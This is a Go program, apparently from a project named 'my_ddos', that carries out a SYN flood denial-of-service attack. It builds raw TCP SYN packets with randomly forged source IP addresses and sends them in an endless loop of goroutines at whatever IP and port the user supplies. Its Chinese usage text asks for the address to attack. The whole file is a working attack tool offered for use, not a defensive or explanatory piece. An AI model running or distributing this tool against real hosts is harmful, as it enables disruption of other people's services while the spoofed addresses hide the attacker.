package main

import (
	"bytes"
	"fmt"
	"log"
	"math/rand"
	"my_ddos/MyFile"
	"net"
	"os"
	"strconv"
	"strings"
	"syscall"
	"time"
)

func main() {
	//初始化
	var (
		err              error
		intPort          int
		targetPort       string
		targetIp         string
		socketAddr       syscall.Sockaddr
		packetHeader     []byte
		targetPortUint64 uint64
		targetPortUint16 uint16
	)
	//创建套接字
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_TCP)
	if err != nil {
		fmt.Println("An Error Occured When Creating Socket [!]", err.Error())
		return
	}
	// set socket options
	err = syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)
	if err != nil {
		fmt.Println("Failed To Set Socket Options [!]", err.Error())
		return
	}
	if len(os.Args) < 3 {
		log.Println("请输入您要攻击的IP地址与端口号，本项目仅用于TCP socket")
		log.Println("使用方法：an_syn_sent <target_ip_address> <target_port>")
		os.Exit(0)
	}
	targetIp = os.Args[1]
	targetPort = os.Args[2]
	if intPort, err = strconv.Atoi(targetPort); err != nil {
		log.Println("端口号不正确:", err.Error())
	}
	if targetPortUint64, err = strconv.ParseUint(targetPort, 10, 16); err != nil {
		log.Println("转换目标port错误：", err.Error())
	}
	targetPortUint16 = uint16(targetPortUint64)
	// var wg sync.WaitGroup
	//开启10000个协程反复攻击
	for {
		time.Sleep(1000 * time.Nanosecond)
		// wg.Add(1)
		go func() {
			packetHeader = createPacketHeader(targetIp, targetPortUint16)
			socketAddr = &syscall.SockaddrInet4{
				Port: intPort,
				Addr: ipSplitFourByte(targetIp),
			}
			if err = syscall.Sendto(fd, packetHeader, 0, socketAddr); err != nil {
				log.Println("SendTo err:", err.Error())
			}
			// wg.Done()
		}()
	}
}

/*
创建包的请求头
*/
func createPacketHeader(targetIp string, targetPort uint16) []byte {
	sourceAddr := createRandomIp()
	packet := &MyFile.TCPHeader{
		Source:      0xaa47, // Random ephemeral port
		Destination: targetPort,
		SeqNum:      rand.Uint32(),
		AckNum:      0,
		DataOffset:  5,      // 4 bits
		Reserved:    0,      // 3 bits
		ECN:         0,      // 3 bits
		Ctrl:        2,      // 6 bits (000010, SYN bit set)
		Window:      0xaaaa, // size of your receive window
		Checksum:    0,      // Kernel will set this if it's 0
		Urgent:      0,
		Options:     []MyFile.TCPOption{},
	}

	sourcePartSlice := strings.Split(sourceAddr, ".")
	targetPartSlice := strings.Split(targetIp, ".")
	s0, _ := strconv.Atoi(sourcePartSlice[0])
	s1, _ := strconv.Atoi(sourcePartSlice[1])
	s2, _ := strconv.Atoi(sourcePartSlice[2])
	s3, _ := strconv.Atoi(sourcePartSlice[3])
	d0, _ := strconv.Atoi(targetPartSlice[0])
	d1, _ := strconv.Atoi(targetPartSlice[1])
	d2, _ := strconv.Atoi(targetPartSlice[2])
	d3, _ := strconv.Atoi(targetPartSlice[3])
	h := &MyFile.Header{
		Version:  4,
		Len:      20,
		TotalLen: 20, // 20 bytes for IP + tcp
		TTL:      64,
		Protocol: 6, // TCP
		Dst:      net.IPv4(byte(d0), byte(d1), byte(d2), byte(d3)),
		Src:      net.IPv4(byte(s0), byte(s1), byte(s2), byte(s3)),
		Checksum: 0,
		// ID, Src and Checksum will be set for us by the kernel
	}
	data := packet.Marshal()
	packet.Checksum = MyFile.Csum(data, ipSplitFourByte(sourceAddr), ipSplitFourByte(targetIp))
	data = packet.Marshal()
	h.TotalLen = h.TotalLen + 20
	out, err := h.Marshal()
	h.Checksum = int(MyFile.Checksum(out))
	out, err = h.Marshal()
	if err != nil {
		log.Fatal(err)
	}
	return append(out, data...)
}

/**
创建随机IP地址
*/
func createRandomIp() (lastIp string) {
	var ipSlice []string
	rand.Seed(time.Now().UnixNano())
	//0~255
	for i := 0; i < 4; i++ {
		ipSlice = append(ipSlice, strconv.Itoa(rand.Intn(252)))
	}
	lastIp = Implode(".", ipSlice)
	fmt.Println("伪造IP地址为：", lastIp)
	return
}

/**
将ip解析为4Byte的数据
*/
func ipSplitFourByte(targetIp string) [4]byte {
	targetIpSliceString := strings.Split(targetIp, ".")
	b0, err := strconv.Atoi(targetIpSliceString[0])
	if err != nil {
		log.Println("解析IP地址时出错，本案例仅用于IPv4", err)
	}
	b1, _ := strconv.Atoi(targetIpSliceString[1])
	b2, _ := strconv.Atoi(targetIpSliceString[2])
	b3, _ := strconv.Atoi(targetIpSliceString[3])
	return [4]byte{byte(b0), byte(b1), byte(b2), byte(b3)}
}

/**
模拟php implode
*/
func Implode(glue string, pieces []string) string {
	var buf bytes.Buffer
	l := len(pieces)
	for _, str := range pieces {
		buf.WriteString(str)
		if l--; l > 0 {
			buf.WriteString(glue)
		}
	}
	return buf.String()
}
